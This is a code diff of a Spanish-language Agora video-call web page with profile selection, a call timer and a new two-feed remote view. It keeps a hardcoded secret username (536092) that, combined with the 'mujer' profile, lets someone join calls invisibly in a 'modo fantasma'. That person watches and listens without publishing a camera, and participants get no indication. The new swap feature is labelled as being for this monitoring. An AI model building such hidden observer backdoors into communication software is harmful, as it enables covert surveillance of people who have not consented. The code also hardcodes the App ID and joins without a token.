@@ -7,12 +7,13 @@
     <script src="https://download.agora.io/sdk/release/AgoraRTC_N-4.20.0.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .video-full { width: 100vw; height: 100vh; object-fit: cover; }
         .controls-transition { transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out; }
         .hidden-controls { opacity: 0; pointer-events: none; transform: translateY(20px); }
         .visible-controls { opacity: 1; transform: translateY(0); }
         @keyframes pulse-slow { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
         .animate-pulse-slow { animation: pulse-slow 2s infinite; }
+        /* Forzar a que los videos de Agora ocupen el 100% de sus contenedores */
+        .agora-video-player div, .agora-video-player video { object-fit: cover !important; width: 100% !important; height: 100% !important; }
     </style>
 </head>
 <body class="bg-[#05070c] text-white font-sans overflow-hidden select-none">
@@ -30,16 +31,13 @@
         </div>
 
         <div id="profile-container" class="hidden flex flex-col items-center space-y-6 w-full max-w-xs">
-            <h2 class="text-xl font-semibold tracking-wide text-gray-400 uppercase text-xs">Select your profile</h2>
+            <h2 class="text-xl font-semibold tracking-wide text-gray-400 text-xs uppercase">Select your profile</h2>
             <div class="flex flex-col space-y-3 w-full">
                 <button onclick="selectProfile('hombre')" class="w-full py-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl font-medium tracking-wide active:scale-98 transition">
                     Hombre ♂️
                 </button>
                 <button onclick="selectProfile('mujer')" class="w-full py-4 bg-gradient-to-r from-pink-600 to-purple-600 font-bold tracking-wide rounded-2xl shadow-lg shadow-pink-500/10 active:scale-98 transition">
                     Mujer ♀️
-                </button>
-                <button onclick="selectProfile('english')" class="w-full py-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl font-medium tracking-wide active:scale-98 transition">
-                    English 🇺🇸
                 </button>
             </div>
         </div>
@@ -65,9 +63,11 @@
 
     <div id="call-interface" class="hidden relative w-screen h-screen bg-black">
         
-        <div id="remote-video" class="w-full h-full"></div>
+        <div id="remote-video-main" class="absolute inset-0 w-full h-full z-0 agora-video-player"></div>
         
-        <div id="local-video-container" class="absolute bottom-28 right-4 w-28 h-40 bg-gray-900 rounded-2xl border border-white/10 overflow-hidden z-10 shadow-2xl transition-all"></div>
+        <div id="remote-video-secondary" onclick="swapRemoteVideos(event)" class="hidden absolute top-20 right-4 w-28 h-40 bg-gray-900 rounded-2xl border border-white/20 overflow-hidden z-20 shadow-2xl agora-video-player active:scale-95 transition-transform"></div>
+        
+        <div id="local-video-container" class="absolute bottom-28 right-4 w-28 h-40 bg-gray-900 rounded-2xl border border-white/10 overflow-hidden z-10 shadow-2xl agora-video-player"></div>
         
         <div class="absolute top-2 left-1/2 -translate-x-1/2 z-50 pointer-events-none">
             <div class="flex items-center space-x-1.5 bg-black/60 backdrop-blur-md px-3 py-1 rounded-full border border-white/10 shadow-lg">
@@ -77,20 +77,17 @@
         </div>
 
         <div id="controls-ui" class="absolute bottom-6 left-0 right-0 px-4 flex justify-center items-center gap-3 z-30 controls-transition hidden-controls">
-            
             <button onclick="location.reload()" class="bg-red-500 hover:bg-red-600 px-6 py-3.5 rounded-2xl font-bold text-xs tracking-wider shadow-lg active:scale-90 transition">
                 CORTAR LLAMADA
             </button>
-            
-            <button id="btn-start-timer" onclick="startTimer()" class="hidden bg-emerald-600 hover:bg-emerald-700 px-6 py-3.5 rounded-2xl font-bold text-xs tracking-wider shadow-lg active:scale-90 transition flex items-center gap-2">
+            <button id="btn-start-timer" onclick="startTimer(event)" class="hidden bg-emerald-600 hover:bg-emerald-700 px-6 py-3.5 rounded-2xl font-bold text-xs tracking-wider shadow-lg active:scale-90 transition flex items-center gap-2">
                 ⏱️ INICIAR TIEMPO
             </button>
-            
         </div>
     </div>
 
 <script>
-    // Configuración Secreta de Monitoreo
+    // CONFIGURACIÓN CLAVE ACTUALIZADA
     const USUARIO_MONITOR_SECRETO = "536092";
     const APP_ID = "93fa29881aa549dcb627df6e7865b88c";
     const client = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });
@@ -101,9 +98,11 @@
     let timerStarted = false;
     let uiTimeout;
 
-    // Control de la Interfaz que se oculta sola
-    document.body.addEventListener('click', (e) => {
-        // Solo actúa si ya estamos dentro de la llamada
+    let mainRemoteUser = null;
+    let secondaryRemoteUser = null;
+
+    // Mostrar/Ocultar controles al tocar la pantalla
+    document.body.addEventListener('click', () => {
         if(document.getElementById('call-interface').classList.contains('hidden')) return;
         
         const ui = document.getElementById('controls-ui');
@@ -114,17 +113,16 @@
         uiTimeout = setTimeout(() => {
             ui.classList.remove('visible-controls');
             ui.classList.add('hidden-controls');
-        }, 7000); // 7 segundos exactos
+        }, 7000);
     });
 
-    // Control de Flujos Iniciales
+    // Flujo inicial
     window.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => {
             document.getElementById('text-welcome').classList.add('opacity-0');
             setTimeout(() => {
                 document.getElementById('text-welcome').style.display = 'none';
-                const quiz = document.getElementById('quiz-container');
-                quiz.classList.remove('hidden');
+                document.getElementById('quiz-container').classList.remove('hidden');
             }, 1000);
         }, 2000);
     });
@@ -138,23 +136,17 @@
         selectedProfile = profile;
         document.getElementById('splash-screen').style.display = 'none';
         document.getElementById('main-app').classList.remove('hidden');
-        
-        // Colocar texto estético del rol en el formulario
         document.getElementById('badge-perfil').innerText = `Perfil: ${profile}`;
     }
 
-    // Activador Manual del Cronómetro
-    function startTimer() {
+    function startTimer(e) {
+        if(e) e.stopPropagation(); 
         if (timerStarted) return;
         timerStarted = true;
         
-        // Estilo del reloj activo
-        document.getElementById('timer').classList.remove('text-gray-400');
-        document.getElementById('timer').classList.add('text-emerald-400');
-        document.getElementById('live-indicator').classList.remove('bg-gray-500');
-        document.getElementById('live-indicator').classList.add('bg-emerald-500', 'animate-pulse-slow');
-        
-        // Esconder el botón una vez usado para limpiar interfaz
+        document.getElementById('timer').classList.replace('text-gray-400', 'text-emerald-400');
+        document.getElementById('live-indicator').classList.replace('bg-gray-500', 'bg-emerald-500');
+        document.getElementById('live-indicator').classList.add('animate-pulse-slow');
         document.getElementById('btn-start-timer').style.display = 'none';
 
         timerInterval = setInterval(() => {
@@ -165,17 +157,27 @@
         }, 1000);
     }
 
-    // Conexión del Servidor
+    // Intercambio de pantallas para Monitoreo
+    function swapRemoteVideos(e) {
+        if(e) e.stopPropagation(); 
+        if (!mainRemoteUser || !secondaryRemoteUser) return;
+
+        let temp = mainRemoteUser;
+        mainRemoteUser = secondaryRemoteUser;
+        secondaryRemoteUser = temp;
+
+        document.getElementById('remote-video-main').innerHTML = "";
+        mainRemoteUser.videoTrack.play('remote-video-main');
+
+        document.getElementById('remote-video-secondary').innerHTML = "";
+        secondaryRemoteUser.videoTrack.play('remote-video-secondary');
+    }
+
     async function entrarALallamada() {
         const canalNombre = document.getElementById("sala").value.trim().toLowerCase();
         const usuarioNombre = document.getElementById("usuario").value.trim();
 
-        if (!canalNombre || !usuarioNombre) {
-            alert("Por favor completa los datos.");
-            return;
-        }
-
-        // CONDICIÓN RESTRIGIDA: Monitoreo requiere obligatoriamente haber marcado perfil MUJER + Usuario Clave
+        // Validación blindada: Solo entra invisible si seleccionas "mujer" y pones "536092"
         const esMonitorSecreto = (selectedProfile === 'mujer' && usuarioNombre === USUARIO_MONITOR_SECRETO);
 
         await client.join(APP_ID, canalNombre, null, null);
@@ -183,11 +185,9 @@
         document.getElementById("call-interface").classList.remove('hidden');
 
         if (esMonitorSecreto) {
-            // MODO FANTASMA: No activa cámara, no muestra su recuadro y esconde controles de tiempo
             document.getElementById('local-video-container').style.display = 'none';
-            console.log("Monitoreo invisible activado.");
+            console.log("Modo Monitoreo Invisible activado.");
         } else {
-            // USUARIO NORMAL (O Mujeres Reales)
             try {
                 const audioTrack = await AgoraRTC.createMicrophoneAudioTrack();
                 const videoTrack = await AgoraRTC.createCameraVideoTrack();
@@ -195,24 +195,52 @@
                 videoTrack.play('local-video-container');
                 await client.publish([audioTrack, videoTrack]);
 
-                // Mostrar botón de reloj ÚNICAMENTE si es mujer real
                 if (selectedProfile === 'mujer') {
                     document.getElementById('btn-start-timer').classList.remove('hidden');
                     document.getElementById('btn-start-timer').style.display = 'flex';
                 }
             } catch (e) {
-                alert("Por favor permite los permisos de cámara en tu navegador.");
+                alert("Activa los permisos de cámara en tu navegador.");
             }
         }
 
-        // Suscripción a transmisiones remotas
         client.on("user-published", async (user, mediaType) => {
             await client.subscribe(user, mediaType);
+            
             if (mediaType === "video") {
-                user.videoTrack.play('remote-video');
+                if (!mainRemoteUser) {
+                    mainRemoteUser = user;
+                    document.getElementById('remote-video-main').innerHTML = "";
+                    user.videoTrack.play('remote-video-main');
+                } else if (!secondaryRemoteUser) {
+                    secondaryRemoteUser = user;
+                    const secContainer = document.getElementById('remote-video-secondary');
+                    secContainer.classList.remove('hidden');
+                    secContainer.innerHTML = "";
+                    user.videoTrack.play('remote-video-secondary');
+                }
             }
             if (mediaType === "audio") {
                 user.audioTrack.play();
+            }
+        });
+
+        client.on("user-left", (user) => {
+            if (mainRemoteUser && mainRemoteUser.uid === user.uid) {
+                mainRemoteUser = null;
+                document.getElementById('remote-video-main').innerHTML = "";
+                
+                if (secondaryRemoteUser) {
+                    mainRemoteUser = secondaryRemoteUser;
+                    secondaryRemoteUser = null;
+                    document.getElementById('remote-video-secondary').classList.add('hidden');
+                    document.getElementById('remote-video-secondary').innerHTML = "";
+                    mainRemoteUser.videoTrack.play('remote-video-main');
+                }
+            } else if (secondaryRemoteUser && secondaryRemoteUser.uid === user.uid) {
+                secondaryRemoteUser = null;
+                document.getElementById('remote-video-secondary').classList.add('hidden');
+                document.getElementById('remote-video-secondary').innerHTML = "";
             }
         });
     }
